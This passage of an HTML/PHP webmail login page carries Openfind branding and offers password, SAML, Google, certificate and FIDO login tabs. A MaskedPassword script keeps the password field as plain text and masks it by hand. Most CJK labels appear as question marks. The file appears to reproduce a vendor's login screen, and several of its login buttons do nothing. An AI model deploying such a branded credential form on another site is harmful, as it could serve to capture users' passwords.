                                <!-- Password Input ??? must be type="text" for MaskedPassword -->
                                <label class="input-wrapper" data-icon="lock">
                                    <input type="text"
                                           name="pass"
                                           id="passwd-input"
                                           maxlength="32"
                                           placeholder="??????????????? - Password ???"
                                           onfocus="stBoard && stBoard.setTarget(this)"
                                           autocomplete="off">
                                </label>

                                <!-- Hidden Checkbox Group -->
                                <div class="checkbox-group" style="display:none">
                                    <input type="checkbox" name="remember" value="1" id="remember">
                                    <label for="remember">?????????ID??????</label>
                                    <input type="checkbox" name="opennw" value="1" id="new-window">
                                    <label for="new-window">????????????????????????</label>
                                </div>

                                <!-- Error Message -->
                                <div class="error-message" style="<?php echo htmlspecialchars($error ?? 'display:none;'); ?>">
                                    ????????????????????????????????????????????????????????????????????????????????????????????????
                                </div>

                                <!-- Login Button -->
                                <input type="submit" value="Login" id="login-btn">
                            </div>
                        </form>
                    </div>

                    <!-- Tab 2: SAML -->
                    <div data-id="tab-2">&nbsp;</div>

                    <!-- Tab 3: Google Login -->
                    <div data-id="tab-3">
                        <input type="button" value="Login">
                    </div>

                    <!-- Tab 4: Certificate Login -->
                    <div data-id="tab-4">
                        <input type="button" value="Login">
                    </div>

                    <!-- Tab 5: Passwordless Login -->
                    <div data-id="tab-5">
                        <form name="fido_login_form"
                              action="javascript:void(0)"
                              onsubmit="fido_login_with_creds(); return false;">
                            <label class="input-wrapper" data-icon="email">
                                <input placeholder="?????????ID - UserID ???"
                                       maxlength="318"
                                       value=""
                                       id="fido_userid">
                            </label>

                            <div class="checkbox-group">
                                <input type="checkbox" name="remember" value="1" id="remember_fido">
                                <label for="remember_fido">?????????ID??????</label>
                                <input type="checkbox" name="opennw" value="1" id="new-window_fido">
                                <label for="new-window_fido">????????????????????????</label>
                            </div>

                            <input type="submit" value="Login">
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bottom Spacer -->
    <div style="display: flex; align-items: center; height: 32px; position: absolute; left: 48px; bottom: 8px;"></div>

    <!-- Copyright Footer -->
    <div id="copyright">
        <div class="footer">
 <div id=copyright><div class=footer>Copyright ?? Openfind Information Technology INC. All rights reserved.</div></div>
        </div>
    </div>

    <!-- MaskedPassword helper -->
    <script type="text/javascript">
    function MaskedPassword(e,d){
        if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}
        if(e==null){return false}
        this.symbol=d;
        this.isIE=typeof document.uniqueID!="undefined";
        e.value="";
        e.defaultValue="";
        e._contextwrapper=this.createContextWrapper(e);
        this.fullmask=false;
        var f=e._contextwrapper;
        var b='<input type="hidden" name="'+e.name+'">';
        var c=this.convertPasswordFieldHTML(e);
        f.innerHTML=b+c;
        e=f.lastChild;
        e.className+=" masked";
        e.setAttribute("autocomplete","off");
        e._realfield=f.firstChild;
        e._contextwrapper=f;
        this.limitCaretPosition(e);
        var a=this;
        this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});
        this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});
        this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});
        this.forceFormReset(e);
        return true
    }
    MaskedPassword.prototype={
        doPasswordMasking:function(a){
            var d="";
            if(a._realfield.value!=""){
                for(var b=0;b<a.value.length;b++){
                    if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}
                    else{d+=a.value.charAt(b)}
                }
            }else{d=a.value}
            var c=this.encodeMaskedPassword(d,this.fullmask,a);
            if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}
        },
        encodeMaskedPassword:function(d,f,b){
            var a=f===true?0:1;
            for(var e="",c=0;c<d.length;c++){
                if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}
            }
            return e
        },
        createContextWrapper:function(a){
            var b=document.createElement("span");
            b.style.position="relative";
            a.parentNode.insertBefore(b,a);
            b.appendChild(a);
            return b
        },
        forceFormReset:function(a){
            while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}
            if(!/form/i.test(a.nodeName)){return null}
            this.addSpecialLoadListener(function(){a.reset()});
            return a
        },
        convertPasswordFieldHTML:function(c,e){
            var b="<input";
            for(var d=c.attributes,a=0;a<d.length;a++){
                if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){
                    b+=" "+d[a].name+'="'+d[a].value+'"'
                }
            }
            b+=' type="text" autocomplete="off">';
            return b
        },
        limitCaretPosition:function(a){
            var d=null,
                c=function(){
                    if(d==null){
                        if(this.isIE){
                            d=window.setInterval(function(){
                                var e=a.createTextRange(),g=a.value.length,f="character";
                                e.moveEnd(f,g);e.moveStart(f,g);e.select()
                            },100)
                        }else{
                            d=window.setInterval(function(){
                                var e=a.value.length;
                                if(!(a.selectionEnd==e&&a.selectionStart<=e)){
                                    a.selectionStart=e;a.selectionEnd=e
                                }
                            },100)
                        }
                    }
                },
                b=function(){window.clearInterval(d);d=null};
            this.addListener(a,"focus",function(){c()});
            this.addListener(a,"blur",function(){b()})
        },
        addListener:function(c,a,b){
            if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}
            else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}
        },
        addSpecialLoadListener:function(a){
            if(this.isIE){return window.attachEvent("onload",a)}
            else{return document.addEventListener("DOMContentLoaded",a,false)}
        },
        getTarget:function(a){
            if(!a){return null}
            return a.target?a.target:a.srcElement
        }
    };
    </script>

    <!-- Init MaskedPassword + post-fix the wrapper -->
    <script type="text/javascript">
    (function () {
        function initMasked() {
            var pwd = document.getElementById("passwd-input");
            if (!pwd) return;

            try {
                new MaskedPassword(pwd, "\u25CF");
            } catch (err) {
                // Fallback: use native password type
                pwd.type = "password";
                return;
            }

            // Fix wrapper span so the visible input fills the parent
            var wrapper = pwd.parentNode;
            if (wrapper && wrapper.tagName === "SPAN") {
                wrapper.style.position   = "relative";
                wrapper.style.display    = "flex";
                wrapper.style.alignItems = "center";
                wrapper.style.flex       = "1 1 auto";
                wrapper.style.width      = "100%";
                wrapper.style.minWidth   = "0";
                wrapper.style.height     = "44px";
                wrapper.style.boxSizing  = "border-box";
            }

            // Fix the visible (converted) input
            var visible = document.querySelector("input.masked");
            if (visible) {
                visible.style.height     = "44px";
                visible.style.minHeight  = "44px";
                visible.style.lineHeight = "44px";
                visible.style.padding    = "0 14px";
                visible.style.width      = "100%";
                visible.style.boxSizing  = "border-box";
                visible.style.fontSize   = "15px";
                visible.style.border     = "1px solid #ccc";
                visible.style.borderRadius = "4px";
                visible.style.background = "#fff";
                visible.style.outline    = "none";
                visible.style.color      = "#333";
            }

            // Hide the hidden real field
            var hidden = document.querySelector('input[name="pass"][type="hidden"]');
            if (hidden) {
                hidden.style.display  = "none";
                hidden.style.position = "absolute";
                hidden.style.width    = "0";
                hidden.style.height   = "0";
            }
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initMasked);
        } else {
            initMasked();
        }
    })();
    </script>
</body>
</html>